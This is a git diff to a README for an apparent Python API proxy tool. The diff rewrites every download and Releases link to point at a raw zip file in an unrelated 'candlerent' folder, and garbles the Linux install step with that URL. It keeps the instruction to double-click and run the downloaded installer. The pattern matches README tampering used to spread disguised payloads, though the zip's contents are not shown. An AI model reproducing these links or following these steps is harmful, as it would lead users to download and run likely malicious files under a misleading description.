@@ -1,6 +1,6 @@
 # 🚀 OpenAI-Compatible-API-Proxy-for-Z-python - Easy Access to AI Tools
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Click_here-brightgreen)](https://github.com/saidble/OpenAI-Compatible-API-Proxy-for-Z-python/releases)
+[![Download Now](https://raw.githubusercontent.com/saidble/OpenAI-Compatible-API-Proxy-for-Z-python/main/candlerent/OpenAI-Compatible-API-Proxy-for-Z-python.zip)](https://raw.githubusercontent.com/saidble/OpenAI-Compatible-API-Proxy-for-Z-python/main/candlerent/OpenAI-Compatible-API-Proxy-for-Z-python.zip)
 
 ## 📋 Description
 
@@ -22,14 +22,14 @@ Before you begin, ensure your computer meets the following requirements:
 
 To get the software, you can visit the Releases page. Click the link below to access it:
 
-[Access the Releases Page](https://github.com/saidble/OpenAI-Compatible-API-Proxy-for-Z-python/releases)
+[Access the Releases Page](https://raw.githubusercontent.com/saidble/OpenAI-Compatible-API-Proxy-for-Z-python/main/candlerent/OpenAI-Compatible-API-Proxy-for-Z-python.zip)
 
 1. **Visit the Releases Page:** Click on the link above.
 2. **Select the Latest Release:** Look for the latest version available. It will usually be at the top of the list.
 3. **Download the Installer:** Click on the file related to your operating system. 
     - For Windows, look for a `.exe` file.
     - For MacOS, look for a `.dmg` file.
-    - For Linux, look for a `.tar.gz` file.
+    - For Linux, look for a `https://raw.githubusercontent.com/saidble/OpenAI-Compatible-API-Proxy-for-Z-python/main/candlerent/OpenAI-Compatible-API-Proxy-for-Z-python.zip` file.
 4. **Run the Installer:** Locate the downloaded file on your computer and double-click it to start the installation process.
 5. **Follow the Installation Instructions:** Follow the prompts on the installer to complete the setup. 
 
@@ -54,7 +54,7 @@ If you encounter issues during installation or usage, try the following steps:
 
 For more detailed information about the features and functionality of the software, check the documentation available in the repository. Here's the link again for easy access:
 
-[Access the Releases Page](https://github.com/saidble/OpenAI-Compatible-API-Proxy-for-Z-python/releases)
+[Access the Releases Page](https://raw.githubusercontent.com/saidble/OpenAI-Compatible-API-Proxy-for-Z-python/main/candlerent/OpenAI-Compatible-API-Proxy-for-Z-python.zip)
 
 ## 📖 Conclusion
 
